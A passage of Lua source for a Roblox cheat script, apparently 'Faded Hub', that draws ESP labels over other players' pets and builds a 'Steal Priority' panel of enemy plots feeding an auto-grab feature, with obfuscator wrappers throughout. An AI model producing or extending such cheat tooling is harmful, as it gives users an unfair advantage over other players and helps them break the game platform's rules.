                local COLOR_SECRET   = Color3.fromRGB(255, 255, 255)
                local STROKE_OG      = Color3.fromRGB(255, 210, 60)
                local STROKE_SECRET  = Color3.fromRGB(0, 0, 0)
                local STROKE_DEFAULT = Color3.fromRGB(0, 0, 0)
                local hlSelected = nil
                local _selSig = _G._FH_SelectedSig
                for _, a in ipairs(cachedBrainrots) do
                    -- Full signature matching prevents two identical species in
                    -- different podiums from sharing the label/highlight.
                    local brsig = tostring(a.plotName or "") .. "::"
                        .. tostring(a.slot or 0) .. "::" .. tostring(a.displayName or "")
                    local isSel = _selSig ~= nil and brsig == _selSig
                    -- A selection is an exact ESP filter, even if normal ESP is on.
                    if _selSig and not isSel then continue end
                    local rr = (a.rarity and a.rarity ~= "") and tostring(a.rarity):lower() or ""
                    local isOG     = rr:find("og") ~= nil
                    local isSecret = rr:find("secret") ~= nil
                    local _ag    = _G._FH_AutoGrab
                    local isPri  = _ag and _ag.isPriority and _ag.isPriority(brsig)
                    local textColor
                    local strokeColor = STROKE_DEFAULT
                    if isSel then
                        textColor = Color3.fromRGB(255, 55, 55)
                    elseif M.enabled then
                        if isPri then
                            textColor = Color3.fromRGB(255, 50, 50)
                        elseif isSecret then
                            textColor   = COLOR_SECRET
                            strokeColor = STROKE_SECRET
                        elseif isOG then
                            textColor   = COLOR_OG
                            strokeColor = STROKE_OG
                        else
                            textColor = Color3.fromRGB(200, 200, 200)
                        end
                    else
                        continue
                    end
                    local part = getPodiumWorldPart(a)
                    if part then
                        if isSel then hlSelected = part end
                        used = used + 1
                        local e = getEntry(used)
                        if e.bb.Adornee ~= part then e.bb.Adornee = part end
                        -- For an Auto Steal Priority selection, use the name
                        -- stored in that exact plot/slot signature. This keeps
                        -- the label tied to the selected pet even when two pets
                        -- share the same species name.
                        local selectedName = isSel and tostring(_selSig):match("^[^:]*::[^:]*::(.+)$") or nil
                        local nm = (selectedName and selectedName ~= "" and selectedName)
                            or a.displayName or "Brainrot"
                        local mut = (a.mutation and a.mutation ~= "") and tostring(a.mutation) or "Base"
                        local genTxt = (a.gen and a.gen ~= "") and tostring(a.gen) or ((a.num or 0) > 0 and (_fhFmtGen(a.num) or "") or "...")
                        if e.mutLbl.Text  ~= mut    then e.mutLbl.Text  = mut    end
                        if e.nameLbl.Text ~= nm     then e.nameLbl.Text = nm     end
                        if e.genLbl.Text  ~= genTxt then e.genLbl.Text  = genTxt end
                        do
                            local function _getMutColor(mutName)
                                local m = mutName:lower()
                                if m:find("rainbow")  then return Color3.fromHSV(os.clock() * 0.4 % 1, 1, 1) end
                                if m:find("gold")     then return Color3.fromRGB(255, 215, 0)   end
                                if m:find("diamond")  then return Color3.fromRGB(100, 185, 255) end
                                if m:find("cyber")    then return Color3.fromRGB(0,   220, 200) end
                                if m:find("phantom")  then return Color3.fromRGB(210, 210, 230) end
                                if m:find("cursed")   then return Color3.fromRGB(210, 30,  30)  end
                                if m:find("divine")   then return Color3.fromRGB(255, 240, 100) end
                                if m:find("heaven")   then return Color3.fromRGB(180, 220, 255) end
                                if m:find("galaxy")   then return Color3.fromRGB(170, 80,  255) end
                                if m:find("bloodrot") then return Color3.fromRGB(180, 20,  20)  end
                                if m:find("crystal")  then return Color3.fromRGB(255, 160, 200) end
                                if m:find("lava")     then return Color3.fromRGB(255, 90,  20)  end
                                if m:find("candy")    then return Color3.fromRGB(255, 150, 200) end
                                if m:find("yingyang") then return Color3.fromRGB(240, 240, 240) end
                                if m:find("pink")     then return Color3.fromRGB(255, 140, 180) end
                                if m == "base"        then return Color3.fromRGB(160, 160, 160) end
                                return Color3.fromRGB(255, 200, 80)
                            end
                            local _mutC = _getMutColor(mut)
                            if e.mutLbl.TextColor3 ~= _mutC then e.mutLbl.TextColor3 = _mutC end
                        end
                        if e.nameLbl.TextColor3 ~= textColor then e.nameLbl.TextColor3 = textColor end
                        if e.nameLbl.TextStrokeColor3 ~= strokeColor then e.nameLbl.TextStrokeColor3 = strokeColor end
                        if e.genLbl.TextStrokeColor3 ~= Color3.fromRGB(0, 0, 0) then e.genLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0) end
                        local genColor = (isSel or isPri) and textColor or Color3.fromRGB(130, 255, 140)
                        if e.genLbl.TextColor3 ~= genColor then e.genLbl.TextColor3 = genColor end
                        if not e.bb.Enabled then e.bb.Enabled = true end
                    end
                end
                for i = used + 1, #pool do
                    if pool[i].bb.Enabled then pool[i].bb.Enabled = false end
                end
                do
                    local targetModel = hlSelected
                    if _podiumHighlight.Adornee ~= targetModel then
                        _podiumHighlight.Adornee = targetModel
                    end
                    _podiumHighlight.Enabled = targetModel ~= nil
                end
            end))
        end)
    end)
    return M
end)()
_G._FH_REG_BrainrotESP = BrainrotESP
_FH_yield()

grabNearestToggle, grabBestToggle, grabPriorityToggle, grabFastToggle = nil, nil, nil, nil
_clearOtherGrabs = nil; _clearOtherGrabs = LPH_NO_VIRTUALIZE(function(keep)
    if keep ~= "n"  and grabNearestToggle  then grabNearestToggle.set(false)  end
    if keep ~= "b"  and grabBestToggle     then grabBestToggle.set(false)     end
    if keep ~= "p"  and grabPriorityToggle then grabPriorityToggle.set(false) end
    if keep ~= "f"  and grabFastToggle     then grabFastToggle.set(false)     end
end)
priorityPanel = MiniPanel("Steal Priority", -280, 110, 234, isMobile and 0.82 or 1)
do
    local RS = game:GetService("ReplicatedStorage")

    local _templateCache = {}
    local _templateIndex = _G._FH_TEMPLATE_INDEX or {}
    local _templateList = _G._FH_TEMPLATE_LIST or {}
    local _templateIndexBuilt = _G._FH_TEMPLATE_INDEX_BUILT or false
    local function _buildTemplateIndex()
        if _templateIndexBuilt and #_templateList > 0 then return end
        if _templateIndexBuilt then
            for _, d in pairs(_templateIndex) do
                _templateList[#_templateList + 1] = d
            end
            _G._FH_TEMPLATE_LIST = _templateList
            return
        end
        _templateIndexBuilt = true
        _G._FH_TEMPLATE_INDEX_BUILT = true
        pcall(LPH_NO_VIRTUALIZE(function()
            local animalsFolder = RS:FindFirstChild("Models") and RS.Models:FindFirstChild("Animals")
            if not animalsFolder then return end
            for _, d in ipairs(animalsFolder:GetChildren()) do
                if d:IsA("Model") then
                    local key = string.lower(d.Name)
                    if _templateIndex[key] == nil then
                        _templateIndex[key] = d
                        _templateList[#_templateList + 1] = d
                    end
                end
            end
            _G._FH_TEMPLATE_INDEX = _templateIndex
            _G._FH_TEMPLATE_LIST = _templateList
        end))
    end
    local function getTemplate(name)
        if _templateCache[name] ~= nil then
            local v = _templateCache[name]
            return v ~= false and v or nil
        end
        local ok, v = pcall(LPH_NO_VIRTUALIZE(function() return RS.Models.Animals[name] end))
        if ok and v then _templateCache[name] = v; return v end
        local lower = string.lower(name)
        _buildTemplateIndex()
        local found = _templateIndex[lower]
        if not found then
            for _, d in ipairs(_templateList) do
                if string.lower(d.Name):find(lower, 1, true) then
                    found = d
                    break
                end
            end
        end
        _templateCache[name] = found or false
        return found
    end
    local function getAnimFolder(name) local ok, v = pcall(LPH_NO_VIRTUALIZE(function() return RS.Animations.Animals[name] end)); return ok and v or nil end
    local fmtNum; fmtNum = LPH_NO_VIRTUALIZE(function(n)
        n = tonumber(n) or 0
        local s = { "", "K", "M", "B", "T", "Qa", "Qi" }
        local i = 1
        while n >= 1000 and i < #s do n = n / 1000; i = i + 1 end
        return string.format(i == 1 and "%d%s" or "%.1f%s", n, s[i])
    end)
    -- Faded Hub player/plot tabs: show one enemy plot at a time.
    local applyFilter
    local ALL_TAB = "__ALL"
    local _activeTab = ALL_TAB
    local _tabBtns = {}
    local _tabOrder = {}
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1, -4, 0, 26)
    tabBar.BackgroundTransparency = 1
    tabBar.BorderSizePixel = 0
    tabBar.ZIndex = 52
    tabBar.Parent = priorityPanel.body
    local tabLayout = Instance.new("UIListLayout")
    tabLayout.FillDirection = Enum.FillDirection.Horizontal
    tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
    tabLayout.Padding = UDim.new(0, 4)
    tabLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    tabLayout.Parent = tabBar

    local function _setActiveTab(plotName)
        _activeTab = plotName
        for name, button in pairs(_tabBtns) do
            local active = name == plotName
            button.BackgroundColor3 = active and T.Accent or T.Card
            button.TextColor3 = active and Color3.new(1, 1, 1) or T.TextMute
        end
        if applyFilter then applyFilter() end
    end

    local allButton = Instance.new("TextButton")
    allButton.Name = "AllBases"
    allButton.AutomaticSize = Enum.AutomaticSize.X
    allButton.Size = UDim2.new(0, 36, 1, 0)
    allButton.BackgroundColor3 = T.Accent
    allButton.AutoButtonColor = false
    allButton.Text = "All"
    allButton.TextColor3 = Color3.new(1, 1, 1)
    allButton.Font = Enum.Font.FredokaOne
    allButton.TextSize = 10
    allButton.BorderSizePixel = 0
    allButton.ZIndex = 53
    allButton.LayoutOrder = 0
    allButton.Parent = tabBar
    Corner(allButton, 6)
    Pad(allButton, 0, 0, 8, 8)
    allButton.Activated:Connect(LPH_NO_VIRTUALIZE(function()
        _setActiveTab(ALL_TAB)
    end))
    _tabBtns[ALL_TAB] = allButton

    local function _getPlotOwnerName(plot)
        local sign = plot:FindFirstChild("PlotSign")
        local surface = sign and sign:FindFirstChild("SurfaceGui")
        local frame = surface and surface:FindFirstChild("Frame")
        local label = frame and frame:FindFirstChild("TextLabel")
        if not label then label = sign and sign:FindFirstChildWhichIsA("TextLabel", true) end
        if not label or label.Text == "" or label.Text == "Empty Base" then return nil end
        return tostring(label.Text):gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
    end

    local function refreshTabs()
        local localPlayer = Players.LocalPlayer
        local myName = localPlayer and localPlayer.Name or ""
        local myDisplay = localPlayer and localPlayer.DisplayName or ""
        local plots = workspace:FindFirstChild("Plots")
        local entries, seen = {}, {[ALL_TAB] = true}

        if plots then
            for _, plot in ipairs(plots:GetChildren()) do
                local plotName = tostring(plot.Name)
                local owner
                local fetch = _G._FH_FetchPlotData or _G._FH_PlotData
                if type(fetch) == "function" then
                    local ok, cache = pcall(fetch, plotName)
                    if ok and type(cache) == "table" then
                        owner = cache.Owner
                            or (type(cache.CacheTable) == "table" and cache.CacheTable.Owner)
                    end
                end
                owner = (owner and tostring(owner) ~= "" and tostring(owner)) or _getPlotOwnerName(plot)
                if owner and owner ~= myName and owner ~= myDisplay then
                    entries[#entries + 1] = {plotName = plotName, ownerName = owner}
                    seen[plotName] = true
                end
            end
        end

        table.sort(entries, function(a, b) return a.ownerName < b.ownerName end)
        for plotName, button in pairs(_tabBtns) do
            if not seen[plotName] then
                button:Destroy()
                _tabBtns[plotName] = nil
                if _activeTab == plotName then _activeTab = ALL_TAB end
            end
        end

        table.clear(_tabOrder)
        _tabOrder[1] = ALL_TAB
        for _, entry in ipairs(entries) do _tabOrder[#_tabOrder + 1] = entry.plotName end
        for order, entry in ipairs(entries) do
            local plotName, ownerName = entry.plotName, entry.ownerName
            local button = _tabBtns[plotName]
            if not button then
                button = Instance.new("TextButton")
                button.AutomaticSize = Enum.AutomaticSize.X
                button.Size = UDim2.new(0, 40, 1, 0)
                button.BackgroundColor3 = T.Card
                button.AutoButtonColor = false
                button.TextColor3 = T.TextMute
                button.Font = Enum.Font.FredokaOne
                button.TextSize = 10
                button.BorderSizePixel = 0
                button.ZIndex = 53
                button.Parent = tabBar
                Corner(button, 6)
                Pad(button, 0, 0, 6, 6)
                button.Activated:Connect(LPH_NO_VIRTUALIZE(function()
                    _setActiveTab(_activeTab == plotName and ALL_TAB or plotName)
                end))
                _tabBtns[plotName] = button
            end
            button.Text = ownerName
            button.LayoutOrder = order
        end

        _setActiveTab(_activeTab)
    end

    tabBar.InputChanged:Connect(LPH_NO_VIRTUALIZE(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseWheel or #_tabOrder == 0 then return end
        local direction = input.Position.Z > 0 and -1 or 1
        local current = 0
        for index, plotName in ipairs(_tabOrder) do
            if plotName == _activeTab then current = index break end
        end
        _setActiveTab(_tabOrder[((current - 1 + direction) % #_tabOrder) + 1])
    end))
    task.spawn(LPH_NO_VIRTUALIZE(function()
        while GUI.Parent and _GEN == _G._FH_GAMMA_GEN do
            pcall(refreshTabs)
            task.wait(5)
        end
    end))

    local _priFilter = ""
    local _lastPriFilterApplied = false
    local searchBox = Instance.new("TextBox")
    searchBox.Size                   = UDim2.new(1, -4, 0, 28)
    searchBox.BackgroundColor3       = T.Card
    searchBox.BackgroundTransparency = 0.1
    searchBox.BorderSizePixel        = 0
    searchBox.Text                   = ""
    searchBox.PlaceholderText        = "search brainrots..."
    searchBox.PlaceholderColor3      = T.TextMute
    searchBox.TextColor3             = T.Text
    searchBox.Font                   = Enum.Font.FredokaOne
    searchBox.TextSize               = 11
    searchBox.TextXAlignment         = Enum.TextXAlignment.Left
    searchBox.ClearTextOnFocus       = false
    searchBox.ZIndex                 = 52
    searchBox.Parent                 = priorityPanel.body
    Corner(searchBox, 8)
    do
        local sp = Instance.new("UIPadding")
        sp.PaddingLeft = UDim.new(0, 26)
        sp.PaddingRight = UDim.new(0, 8)
        sp.Parent = searchBox
        local ic = Lbl(searchBox, "\u{1F50D}", 11, T.TextMute, Enum.Font.FredokaOne)
        ic.Size     = UDim2.new(0, 16, 1, 0)
        ic.Position = UDim2.new(0, -20, 0, 0)
        ic.ZIndex   = 53
        local ss = Instance.new("UIStroke")
        ss.Color = T.TextMute
        ss.Transparency = 0.75
        ss.Thickness = 1
        ss.Parent = searchBox
        searchBox.Focused:Connect(LPH_NO_VIRTUALIZE(function()
            Tween(ss, TweenInfo.new(0.15), { Transparency = 0.2, Color = T.Accent or T.White })
        end))
        searchBox.FocusLost:Connect(LPH_NO_VIRTUALIZE(function()
            Tween(ss, TweenInfo.new(0.2), { Transparency = 0.75, Color = T.TextMute })
        end))
    end
    searchBox:GetPropertyChangedSignal("Text"):Connect(LPH_NO_VIRTUALIZE(function()
        _priFilter = string.lower(searchBox.Text or "")
        if applyFilter then applyFilter() end
    end))
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size                   = UDim2.new(1, -4, 0, 230)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel        = 0
    scroll.ScrollBarThickness     = 3
    scroll.ScrollBarImageColor3   = T.White
    scroll.CanvasSize             = UDim2.new(0, 0, 0, 0)
    scroll.AutomaticCanvasSize    = Enum.AutomaticSize.Y
    scroll.ScrollingDirection     = Enum.ScrollingDirection.Y
    scroll.ZIndex                 = 52
    scroll.Parent                 = priorityPanel.body
    local sl = Instance.new("UIListLayout")
    sl.Padding   = UDim.new(0, 5)
    sl.SortOrder = Enum.SortOrder.LayoutOrder
    sl.Parent    = scroll
    local traitText; traitText = LPH_NO_VIRTUALIZE(function(traits)
        if typeof(traits) ~= "table" then return nil end
        local list = {}
        for k, v in pairs(traits) do
            if type(k) == "number" then list[#list + 1] = tostring(v) else list[#list + 1] = tostring(k) end
        end
        return #list > 0 and table.concat(list, ", ") or nil
    end)
    -- normalize a traits table into a plain list of trait names
    local traitList; traitList = LPH_NO_VIRTUALIZE(function(traits)
        if typeof(traits) ~= "table" then return {} end
        local list = {}
        for k, v in pairs(traits) do
            if type(k) == "number" then list[#list + 1] = tostring(v) else list[#list + 1] = tostring(k) end
        end
        return list
    end)
    -- try to pull an image asset for a trait out of the game's Traits data
    local traitIconAsset; traitIconAsset = LPH_NO_VIRTUALIZE(function(name)
        local TD = _G._FH_TraitsData
        if type(TD) ~= "table" then return nil end
        local d = TD[name]
        if type(d) ~= "table" then return nil end
        for _, field in ipairs({ "Icon", "Image", "ImageId", "Thumbnail", "Asset", "Texture" }) do
            local v = d[field]
            if type(v) == "number" then return "rbxassetid://" .. v end
            if type(v) == "string" and v ~= "" then
                if v:find("rbxassetid://", 1, true) or v:find("rbxthumb", 1, true) then return v end
                if v:match("^%d+$") then return "rbxassetid://" .. v end
            end
        end
        return nil
    end)
    -- emoji fallback for common traits (used when no image asset is found)
    local _TRAIT_EMOJI = {
        fire = "🔥", burning = "🔥", lava = "🌋", ice = "❄️", frozen = "❄️", cold = "❄️",
        shock = "⚡", electric = "⚡", lightning = "⚡", storm = "🌩️", wet = "💧", rain = "🌧️",
        wind = "🌬️", gold = "🪙", golden = "🪙", diamond = "💎", crystal = "💎",
        star = "⭐", cosmic = "🌌", galaxy = "🌌", glowing = "✨", shiny = "✨", sparkle = "✨",
        toxic = "☠️", poison = "☠️", radioactive = "☢️", bloody = "🩸", cursed = "😈",
        angel = "😇", divine = "😇", heavenly = "😇", rainbow = "🌈", night = "🌙",
        sun = "☀️", solar = "☀️", zombie = "🧟", ghost = "👻", robot = "🤖", cyber = "🤖",
        love = "❤️", candy = "🍬", fast = "💨", speed = "💨", strong = "💪", giant = "🦣",
    }
    local traitEmoji; traitEmoji = LPH_NO_VIRTUALIZE(function(name)
        local l = tostring(name):lower()
        for key, emo in pairs(_TRAIT_EMOJI) do
            if l:find(key, 1, true) then return emo end
        end
        return nil
    end)
    -- (re)fill a holder frame with trait icons (image chips, emoji, or text fallback)
    local _traitSig; _traitSig = LPH_NO_VIRTUALIZE(function(traits)
        local names = traitList(traits)
        table.sort(names)
        return table.concat(names, "|")
    end)
    local fillTraitIcons; fillTraitIcons = LPH_NO_VIRTUALIZE(function(holder, traits)
        for _, ch in ipairs(holder:GetChildren()) do
            if not ch:IsA("UIListLayout") then pcall(LPH_NO_VIRTUALIZE(function() ch:Destroy() end)) end
        end
        local names = traitList(traits)
        for _, tn in ipairs(names) do
            local asset = traitIconAsset(tn)
            if asset then
                local img = Instance.new("ImageLabel")
                img.BackgroundTransparency = 1
                img.Size                   = UDim2.new(0, 15, 0, 15)
                img.Image                  = asset
                img.ScaleType              = Enum.ScaleType.Fit
                img.ZIndex                 = 55
                img.Parent                 = holder
            else
                local chip = Instance.new("TextLabel")
                chip.BackgroundColor3       = T.BgDeep
                chip.BackgroundTransparency = 0.25
                chip.Size                   = UDim2.new(0, 16, 0, 15)
                chip.AutomaticSize          = Enum.AutomaticSize.X
                chip.Font                   = Enum.Font.FredokaOne
                chip.TextSize               = 10
                chip.TextColor3             = Color3.fromRGB(200, 200, 230)
                chip.Text                   = traitEmoji(tn) or tostring(tn):sub(1, 3)
                chip.ZIndex                 = 55
                chip.Parent                 = holder
                Corner(chip, 4)
                Pad(chip, 0, 0, 3, 3)
            end
        end
    end)
    -- build a horizontal row of trait icons and return the holder
    local makeTraitIcons; makeTraitIcons = LPH_NO_VIRTUALIZE(function(parent, traits)
        local holder = Instance.new("Frame")
        holder.BackgroundTransparency = 1
        holder.Size                   = UDim2.new(1, -82, 0, 16)
        holder.Position               = UDim2.new(0, 72, 0, 40)
        holder.ZIndex                 = 54
        holder.Parent                 = parent
        local row = Instance.new("UIListLayout")
        row.FillDirection       = Enum.FillDirection.Horizontal
        row.VerticalAlignment   = Enum.VerticalAlignment.Center
        row.SortOrder           = Enum.SortOrder.LayoutOrder
        row.Padding             = UDim.new(0, 3)
        row.Parent              = holder
        fillTraitIcons(holder, traits)
        return holder
    end)
    local rows = {}
    local recSig; recSig = LPH_NO_VIRTUALIZE(function(rec)
        return tostring(rec.plotName or "") .. "::" .. tostring(rec.pod or 0) .. "::" .. tostring(rec.name)
    end)
    local _baseNums, _baseCount = {}, 0
    local baseNumFor; baseNumFor = LPH_NO_VIRTUALIZE(function(plotName)
        local key = tostring(plotName or "")
        if not _baseNums[key] then _baseCount = _baseCount + 1; _baseNums[key] = _baseCount end
        return _baseNums[key]
    end)

    local findAnimalModel; findAnimalModel = LPH_NO_VIRTUALIZE(function(rec)
        local live = rec.modelInst
        if live and pcall(function() return live.Parent end) and live.Parent then
            return live
        end
        local plot = rec.plot
        if not plot then return nil end
        local wanted = rec.modelName or rec.name or ""
        local lower  = string.lower(wanted)

        for _, ch in ipairs(_FH_GetDesc(plot)) do
            if ch:IsA("Model") then
                local cln = string.lower(ch.Name)
                if ch.Name == wanted or cln == lower
                    or cln:find(lower, 1, true)
                    or lower:find(cln, 1, true) then
                    return ch
                end
            end
        end
        return nil
    end)

    local makeModelViewport; makeModelViewport = LPH_NO_VIRTUALIZE(function(parent, rec)
        local vpf = Instance.new("ViewportFrame")
        vpf.Size                   = UDim2.new(0, 60, 0, 60)
        vpf.Position               = UDim2.new(0, 6, 0, 2)
        vpf.BackgroundColor3       = T.BgDeep
        vpf.BackgroundTransparency = 0.35
        vpf.BorderSizePixel        = 0
        vpf.ZIndex                 = 54
        vpf.Ambient                = Color3.new(1, 1, 1)
        vpf.LightColor             = Color3.new(1, 1, 1)
        vpf.Parent                 = parent
        Corner(vpf, 6)
        task.spawn(LPH_NO_VIRTUALIZE(function()
            local src = findAnimalModel(rec) or getTemplate(rec.modelName or rec.name or "")
            if not src then return end
            local ok, clone = pcall(function() return src:Clone() end)
            if not ok or not clone then return end

            for _, d in ipairs(_FH_GetDesc(clone)) do
                if d:IsA("BasePart") then
                    d.Anchored   = true
                    d.CanCollide = false
                    d.CanQuery   = false
                    d.CanTouch   = false
                    d.Massless   = true
                elseif d:IsA("Humanoid") or d:IsA("Animator") or d:IsA("AnimationController")
                    or d:IsA("Script") or d:IsA("LocalScript") or d:IsA("ModuleScript")
                    or d:IsA("ParticleEmitter") or d:IsA("Trail") or d:IsA("Beam")
                    or d:IsA("Fire") or d:IsA("Smoke") or d:IsA("Sparkles") then
                    pcall(LPH_NO_VIRTUALIZE(function() d:Destroy() end))
                end
            end

            pcall(LPH_NO_VIRTUALIZE(function() clone:PivotTo(CFrame.new()) end))
            local cam = Instance.new("Camera")
            cam.FieldOfView = 40
            cam.Parent = vpf
            vpf.CurrentCamera = cam
            clone.Parent = vpf
            local cf, size
            local okBB, bcf, bsize = pcall(function() return clone:GetBoundingBox() end)
            if okBB then cf, size = bcf, bsize else cf, size = CFrame.new(), Vector3.new(4, 4, 4) end
            local radius = math.max(size.Magnitude / 2, 1)
            local dist   = radius / math.tan(math.rad(cam.FieldOfView * 0.5)) * 1.15
            local center = cf.Position
            local _spinAngle = 0
            local _spinAccumulator = 0
            local _spinConn; _spinConn = RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function(dt)
				if not priorityPanel.panel.Visible then return end
				_spinAccumulator = _spinAccumulator + dt
				if _spinAccumulator < 0.067 then return end
				dt = _spinAccumulator
				_spinAccumulator = 0
                _spinAngle = _spinAngle + dt * 45
                local rad = math.rad(_spinAngle)
                cam.CFrame = CFrame.new(
                    center + Vector3.new(dist * math.sin(rad), size.Y * 0.25, dist * math.cos(rad)),
                    center
                )
            end))
            vpf.AncestryChanged:Connect(LPH_NO_VIRTUALIZE(function()
                if not vpf.Parent then _spinConn:Disconnect() end
            end))
        end))
        return vpf
    end)
    local function makeCard(rec)
        local name = rec.name
        local sig = recSig(rec)
        local card = Instance.new("TextButton")
        card.Size             = UDim2.new(1, -6, 0, 84)
        card.BackgroundColor3 = T.Card
        card.AutoButtonColor  = false
        card.Text             = ""
        card.BorderSizePixel  = 0
        card.ZIndex           = 53
        card.Parent           = scroll
        Corner(card, 8)
        local baseStroke = Stroke(card, T.Line, 1)
        local gradStroke = GradStroke(card, 1.6, 1, 0)
        makeModelViewport(card, rec)
        local nameLbl = Lbl(card, name, 10, T.Text, Enum.Font.FredokaOne)
        nameLbl.Size           = UDim2.new(1, -82, 0, 14)
        nameLbl.Position       = UDim2.new(0, 72, 0, 24)
        nameLbl.TextYAlignment = Enum.TextYAlignment.Top
        nameLbl.TextWrapped    = false
        nameLbl.TextTruncate   = Enum.TextTruncate.AtEnd
        nameLbl.ZIndex         = 54
        local rawMut = (rec.mutation and rec.mutation ~= "") and tostring(rec.mutation) or "Base"
        local _rawMutL = rawMut:lower()
        local traitHolder = makeTraitIcons(card, rec.traits)
        traitHolder.Position = UDim2.new(0, 72, 0, 42)
        traitHolder.ZIndex   = 55
        local _lastTraitS = _traitSig(rec.traits)
        local function _getMutColor(mutName)
            local m = mutName:lower()
            if m:find("rainbow")  then return Color3.fromHSV(os.clock() * 0.4 % 1, 1, 1) end
            if m:find("gold")     then return Color3.fromRGB(255, 215, 0)   end
            if m:find("diamond")  then return Color3.fromRGB(100, 185, 255) end
            if m:find("cyber")    then return Color3.fromRGB(0,   220, 200) end
            if m:find("phantom")  then return Color3.fromRGB(210, 210, 230) end
            if m:find("cursed")   then return Color3.fromRGB(210, 30,  30)  end
            if m:find("divine")   then return Color3.fromRGB(255, 240, 100) end
            if m:find("heaven")   then return Color3.fromRGB(180, 220, 255) end
            if m:find("galaxy")   then return Color3.fromRGB(170, 80,  255) end
            if m:find("bloodrot") then return Color3.fromRGB(180, 20,  20)  end
            if m:find("crystal")  then return Color3.fromRGB(255, 160, 200) end
            if m:find("lava")     then return Color3.fromRGB(255, 90,  20)  end
            if m:find("candy")    then return Color3.fromRGB(255, 150, 200) end
            if m:find("yingyang") then return Color3.fromRGB(240, 240, 240) end
            if m:find("pink")     then return Color3.fromRGB(255, 140, 180) end
            if m == "base"        then return Color3.fromRGB(160, 160, 160) end
            return Color3.fromRGB(255, 200, 80)
        end
        local _initMutC = _getMutColor(rawMut)
        local mutLbl = Lbl(card, rawMut, 9, _initMutC, Enum.Font.FredokaOne)
        mutLbl.Size          = UDim2.new(1, -82, 0, 13)
        mutLbl.Position      = UDim2.new(0, 72, 0, 6)
        mutLbl.TextTruncate  = Enum.TextTruncate.AtEnd
        mutLbl.ZIndex        = 55
        -- generation (synchronizer first, ESP lookup as fallback) + trait names
        local resolveGen; resolveGen = LPH_NO_VIRTUALIZE(function(r)
            local gv = tonumber(r.genValue) or 0
            if gv <= 0 then
                local lut = _G._FH_GenLookup
                if type(lut) == "table" then
                    local li = lut[tostring(r.plotName or "") .. "::" .. tostring(r.pod or 0)]
                    if type(li) == "table" then
                        local lg = tonumber(li.gen)
                        if lg and lg > 0 then gv = lg end
                    end
                end
            end
            return gv
        end)
        local _escRT; _escRT = LPH_NO_VIRTUALIZE(function(s)
            return (tostring(s):gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;"))
        end)
        local genLbl = Lbl(card, "", 10, Color3.fromRGB(130, 255, 140), Enum.Font.FredokaOne)
        genLbl.Size          = UDim2.new(1, -82, 0, 13)
        genLbl.Position      = UDim2.new(0, 72, 0, 60)
        genLbl.TextTruncate  = Enum.TextTruncate.AtEnd
        genLbl.RichText      = true
        genLbl.ZIndex        = 55
        local _lastGenTxt = nil
        local setGenText; setGenText = LPH_NO_VIRTUALIZE(function(gv, traits)
            local txt
            if (gv or 0) > 0 then
                local fmt = _G._FH_FmtGen
                local gs = fmt and fmt(gv) or ("$" .. tostring(math.floor(gv)) .. "/s")
                txt = '<font color="#82FF8C">' .. _escRT(gs) .. '</font>'
            else
                txt = '<font color="#9AA0B4">...</font>'
            end
            local tt = traitText(traits)
            if tt then
                txt = txt .. ' <font color="#9AA0B4">- ' .. _escRT(tt) .. '</font>'
            end
            if txt ~= _lastGenTxt then
                _lastGenTxt = txt
                genLbl.Text = txt
            end
        end)
        setGenText(resolveGen(rec), rec.traits)
        local paint; paint = LPH_NO_VIRTUALIZE(function()
            local on = AutoGrab.isPriority(sig)
            card.BackgroundColor3   = on and T.SideActive or T.Card
            baseStroke.Transparency = on and 1 or 0
            gradStroke.Transparency = on and 0 or 1
            mutLbl.TextColor3 = _getMutColor(rawMut)
        end)
        paint()
        -- refresh mutation / trait icons when the synchronizer resolves later
        local update; update = LPH_NO_VIRTUALIZE(function(newRec)
            if not newRec then return end
            -- merge in richer data from the ESP synchronizer lookup if available
            local mut    = newRec.mutation
            local traits = newRec.traits
            local lut = _G._FH_GenLookup
            if type(lut) == "table" then
                local key = tostring(newRec.plotName or "") .. "::" .. tostring(newRec.pod or 0)
                local li  = lut[key]
                if type(li) == "table" then
                    if (not mut or mut == "") and li.mutation then mut = li.mutation end
                    if (typeof(traits) ~= "table" or next(traits) == nil) and li.traits then traits = li.traits end
                end
            end
            local nm = (mut and mut ~= "") and tostring(mut) or "Base"
            if nm ~= rawMut then
                rawMut = nm
                mutLbl.Text = rawMut
                mutLbl.TextColor3 = _getMutColor(rawMut)
            end
            local ts = _traitSig(traits)
            if ts ~= _lastTraitS then
                _lastTraitS = ts
                fillTraitIcons(traitHolder, traits)
            end
            setGenText(resolveGen(newRec), traits)
        end)
        card.Activated:Connect(LPH_NO_VIRTUALIZE(function()
            local wasOn = AutoGrab.isPriority(sig)
            for k in pairs(AutoGrab.priority) do AutoGrab.priority[k] = nil end
            if not wasOn then AutoGrab.priority[sig] = true end
            Config.set("priority_set", AutoGrab.priority)
            _G._FH_SelectedSig = next(AutoGrab.priority)
            for _, r in pairs(rows) do r.paint() end
        end))
        local hoverC = T.Card:Lerp(Color3.new(1, 1, 1), 0.07)
        card.MouseEnter:Connect(LPH_NO_VIRTUALIZE(function()
            if not AutoGrab.isPriority(sig) then
                Tween(card, TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = hoverC })
            end
        end))
        card.MouseLeave:Connect(LPH_NO_VIRTUALIZE(function()
            if not AutoGrab.isPriority(sig) then
                Tween(card, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = T.Card })
            end
        end))
        rows[sig] = {
            card = card,
            paint = paint,
            update = update,
            name = name,
            plotName = tostring(rec.plotName or ""),
        }
    end
    applyFilter = LPH_NO_VIRTUALIZE(function()
        for _, r in pairs(rows) do
            if r.card then
                local n = string.lower(tostring(r.name or ""))
                local nameMatch = _priFilter == "" or n:find(_priFilter, 1, true) ~= nil
                local tabMatch = _activeTab == ALL_TAB or r.plotName == _activeTab
                r.card.Visible = nameMatch and tabMatch
            end
        end
    end)
    local indicator = Instance.new("TextButton")
    indicator.AnchorPoint            = Vector2.new(0.5, 1)
